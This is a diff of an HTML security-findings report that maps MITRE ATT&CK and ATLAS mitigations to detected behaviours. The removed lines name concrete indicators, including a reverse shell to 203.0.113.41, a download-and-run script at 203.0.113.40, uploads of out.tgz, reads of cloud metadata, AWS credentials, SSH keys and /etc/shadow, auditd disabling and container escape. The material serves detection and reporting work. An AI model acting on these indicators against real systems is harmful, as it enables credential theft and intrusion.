 <tr class="detail"><td colspan="3"><div class="under">
 <p>Multi-Factor Authentication (MFA) enhances security by requiring users to provide at least two forms of verification to prove their identity before granting access.</p>
-<div class="pair"><span class="label">for</span><span class="value">AccountCreation: account svc</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
+<div class="pair"><span class="label">for</span><span class="value">AccountCreation</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1033 Limit Software Installation</td><td class="cell">T1543.002</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent users or groups from installing unauthorized or unapproved software to reduce the risk of introducing malicious or vulnerable applications.</p>
-<div class="pair"><span class="label">for</span><span class="value">SystemdUnitCreation: unit sync.service</span></div>
+<div class="pair"><span class="label">for</span><span class="value">SystemdUnitCreation</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1035 Limit Access to Resource Over Network</td><td class="cell">T1552.005, T1552.007</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Restrict access to network resources, such as file shares, remote systems, and services, to only those users, accounts, or systems with a legitimate business requirement.</p>
-<div class="pair"><span class="label">for</span><span class="value">CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/</span></div>
+<div class="pair"><span class="label">for</span><span class="value">CloudMetadataAccess, ClusterSecretRead</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1037 Filter Network Traffic</td><td class="cell">T1048, T1095, T1105, T1552.005</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label"></span><span class="value">CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload, ReverseShell, ShellDownloadAndExecute, CloudMetadataAccess</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1038 Execution Prevention</td><td class="cell">T1059.004, T1611, T1685</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent the execution of unauthorized or malicious code on systems by implementing application control, script blocking, and other execution prevention mechanisms.</p>
-<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
-<div class="pair"><span class="label"></span><span class="value">ContainerEscape: mount /:/host</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: service auditd</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute, ReverseShell, ContainerEscape, SecurityToolDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1039 Environment Variable Permissions</td><td class="cell">T1070.003, T1690</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Restrict the modification of environment variables to authorized users and processes by enforcing strict permissions and policies.</p>
-<div class="pair"><span class="label">for</span><span class="value">HistoryDisabling: setting HISTFILE</span></div>
+<div class="pair"><span class="label">for</span><span class="value">HistoryClearing, HistoryDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1041 Encrypt Sensitive Information</td><td class="cell">T1552.004, T1685.006</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Protect sensitive information at rest, in transit, and during processing by using strong encryption algorithms.</p>
-<div class="pair"><span class="label">for</span><span class="value">PrivateKeyRead: file ~/.ssh/id_rsa</span></div>
-<div class="pair"><span class="label"></span><span class="value">LogDeletion: log /var/log/auth.log</span></div>
+<div class="pair"><span class="label">for</span><span class="value">PrivateKeyRead, LogDeletion</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1042 Disable or Remove Feature or Program</td><td class="cell">T1098.004, T1552.005, T1611, T1685</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries.</p>
-<div class="pair"><span class="label">for</span><span class="value">SshKeyPersistence: file ~/.ssh/authorized_keys</span></div>
-<div class="pair"><span class="label"></span><span class="value">CloudMetadataAccess: url http://169.254.169.254/latest/meta-data/</span></div>
-<div class="pair"><span class="label"></span><span class="value">ContainerEscape: mount /:/host</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: service auditd</span></div>
+<div class="pair"><span class="label">for</span><span class="value">SshKeyPersistence, CloudMetadataAccess, ContainerEscape, SecurityToolDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1047 Audit</td><td class="cell">T1053.002, T1053.003, T1095, T1552.001, T1552.004, T1560.001, T1685, T1685.004, T1686</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations.</p>
-<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation: runs $JOB</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
-<div class="pair"><span class="label"></span><span class="value">CredentialFileRead: file ~/.aws/credentials</span></div>
-<div class="pair"><span class="label"></span><span class="value">PrivateKeyRead: file ~/.ssh/id_rsa</span></div>
-<div class="pair"><span class="label"></span><span class="value">ArchiveCreation: archive out.tgz</span></div>
-<div class="pair"><span class="label"></span><span class="value">SecurityToolDisabling: service auditd</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ScheduledJobCreation, ReverseShell, CredentialFileRead, PrivateKeyRead, ArchiveCreation, SecurityToolDisabling, FirewallDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1048 Application Isolation and Sandboxing</td><td class="cell">T1611</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Application Isolation and Sandboxing refers to the technique of restricting the execution of code to a controlled and isolated environment (e.g., a virtual environment, container, or sandbox).</p>
-<div class="pair"><span class="label">for</span><span class="value">ContainerEscape: mount /:/host</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ContainerEscape</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1051 Update Software</td><td class="cell">T1611</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Software updates ensure systems are protected against known vulnerabilities by applying patches and upgrades provided by vendors.</p>
-<div class="pair"><span class="label">for</span><span class="value">ContainerEscape: mount /:/host</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ContainerEscape</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1054 Software Configuration</td><td class="cell">T1685</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Software configuration refers to making security-focused adjustments to the settings of applications, middleware, databases, or other software to mitigate potential threats.</p>
-<div class="pair"><span class="label">for</span><span class="value">SecurityToolDisabling: service auditd</span></div>
+<div class="pair"><span class="label">for</span><span class="value">SecurityToolDisabling</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">M1057 Data Loss Prevention</td><td class="cell">T1048</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Data Loss Prevention (DLP) involves implementing strategies and technologies to identify, categorize, monitor, and control the movement of sensitive data within an organization.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0005 Control Access to AI Models and Data at Rest</td><td class="cell">AML.T0025</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Establish access controls on internal model registries and limit internal access to production models.</p>
-<div class="pair"><span class="label">for</span><span class="value">FileUpload: url https://files.example.net/up, file out.tgz</span></div>
+<div class="pair"><span class="label">for</span><span class="value">FileUpload</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0011 Restrict Library Loading</td><td class="cell">AML.T0050, AML.T0090, AML.T0142</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Prevent abuse of library loading mechanisms in the operating system and software to load untrusted code by configuring appropriate library loading mechanisms and investigating potential vulnerable software.</p>
-<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label"></span><span class="value">ReverseShell: host 203.0.113.41 ($H), port $PORT</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShadowFileRead: file /etc/shadow</span></div>
-<div class="pair"><span class="label"></span><span class="value">ShellProfilePersistence: file ~/.bashrc, adds $LINE</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute, ReverseShell, ShadowFileRead, ShellProfilePersistence</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0013 Code Signing</td><td class="cell">AML.T0142</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</p>
-<div class="pair"><span class="label">for</span><span class="value">ShellProfilePersistence: file ~/.bashrc, adds $LINE</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShellProfilePersistence</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark high">[x]</td><td class="cell">AML.M0043 AI Agent External Resource Lifecycle Management</td><td class="cell">AML.T0072, AML.T0125</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
 <p>Organizations should control external resources created or acquired by AI agents during execution by treating those resources as attributable, lifecycle-managed assets.</p>
-<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute: url http://203.0.113.40/s.sh</span></div>
-<div class="pair"><span class="label"></span><span class="value">AccountCreation: account svc</span></div>
+<div class="pair"><span class="label">exposed</span><span class="value">username: svc</span></div>
+<div class="pair"><span class="label">for</span><span class="value">ShellDownloadAndExecute, AccountCreation</span></div>
 </div></td></tr>
 <tr class="entry"><td class="mark low">[i]</td><td class="cell">AML.M0020 Generative AI Guardrails</td><td class="cell">AML.T0102</td></tr>
 <tr class="detail"><td colspan="3"><div class="under">
